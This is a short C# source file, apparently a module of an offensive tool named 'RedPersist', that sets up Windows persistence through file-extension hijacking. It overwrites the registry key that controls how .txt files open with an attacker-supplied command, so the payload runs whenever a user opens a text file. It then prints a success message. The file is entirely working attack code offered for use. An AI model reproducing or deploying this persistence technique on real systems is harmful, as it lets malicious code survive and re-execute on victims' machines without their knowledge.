using Microsoft.Win32;
using System;
namespace RedPersist.Persist
{
    public class Extension1
    {
        public static void Do(string[] args)
        {
            RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"txtfile\\shell\\open\\command");
            key.SetValue("", args[1]);
            key.Close();
            Console.WriteLine("[*] Extension Hijacking Persistence created");

        }
    }
}
